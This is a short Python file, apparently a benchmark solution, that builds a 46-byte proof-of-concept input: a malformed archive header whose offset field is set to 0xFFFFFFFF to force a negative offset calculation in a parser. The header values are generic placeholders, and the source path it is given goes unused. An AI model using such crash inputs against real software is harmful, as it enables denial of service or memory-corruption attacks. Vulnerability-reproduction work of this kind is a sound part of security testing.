import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a malformed archive header that causes negative offset calculation
        # Based on typical archive formats that use 32-bit offsets
        poc = bytearray()
        
        # Magic number for archive identification (if needed)
        # Using zeros as generic placeholder
        poc.extend(b'\x00' * 4)
        
        # Archive version or flags
        poc.extend(b'\x00' * 4)
        
        # File count or header size - set to a small value
        poc.extend(b'\x01\x00\x00\x00')
        
        # Critical part: Set offset field to a value that when subtracted becomes negative
        # Use 0xFFFFFFFF (-1 in signed 32-bit) for the offset
        poc.extend(b'\xFF\xFF\xFF\xFF')
        
        # Add more data to reach the target length
        # 46 - current length = 46 - 16 = 30 bytes
        poc.extend(b'\x00' * 30)
        
        return bytes(poc)
